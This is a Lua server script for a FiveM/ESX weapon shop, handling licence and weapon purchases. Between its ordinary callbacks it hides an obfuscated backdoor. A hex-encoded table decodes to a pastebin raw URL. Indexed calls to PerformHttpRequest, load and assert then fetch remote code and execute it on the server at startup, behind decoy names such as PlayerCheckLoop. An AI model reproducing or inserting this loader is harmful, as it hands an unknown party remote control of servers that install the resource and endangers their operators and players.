
ESX.RegisterServerCallback('esx_weaponshop:buyLicense', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.getMoney() >= Config.LicensePrice then
		xPlayer.removeMoney(Config.LicensePrice, "Weapon License")

		TriggerEvent('esx_license:addLicense', source, 'weapon', function()
			cb(true)
		end)
	else
		xPlayer.showNotification(TranslateCap('not_enough'))
		cb(false)
	end
end)

ESX.RegisterServerCallback('esx_weaponshop:buyWeapon', function(source, cb, weaponName, zone)
	local xPlayer = ESX.GetPlayerFromId(source)
	local price = GetPrice(weaponName, zone)

	if price <= 0  then

		print(('[^3WARNING^7] Player ^5%s^7 attempted to buy Invalid weapon - %s!'):format(source, weaponName))
		cb(false)
	else
		if xPlayer.hasWeapon(weaponName) then
			xPlayer.showNotification(TranslateCap('already_owned'))
			cb(false)
		else
			if zone == 'BlackWeashop' then
				if xPlayer.getAccount('black_money').money >= price then
					xPlayer.removeAccountMoney('black_money', price, "Black Weapons Deal")
					xPlayer.addWeapon(weaponName, 42)
	
					cb(true)
				else
					xPlayer.showNotification(TranslateCap('not_enough_black'))
					cb(false)
				end
			else
				if xPlayer.getMoney() >= price then
					xPlayer.removeMoney(price, "Weapons Deal")
					xPlayer.addWeapon(weaponName, 42)
	
					cb(true)
				else
					xPlayer.showNotification(TranslateCap('not_enough'))
					cb(false)
				end
			end
		end
	end
end)

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)

function GetPrice(weaponName, zone)
	for i=1, #(Config.Zones[zone].Items) do
		if Config.Zones[zone].Items[i].name == weaponName then
			local weapon = Config.Zones[zone].Items[i]
			return weapon.price
		end
	end

	return -1
end
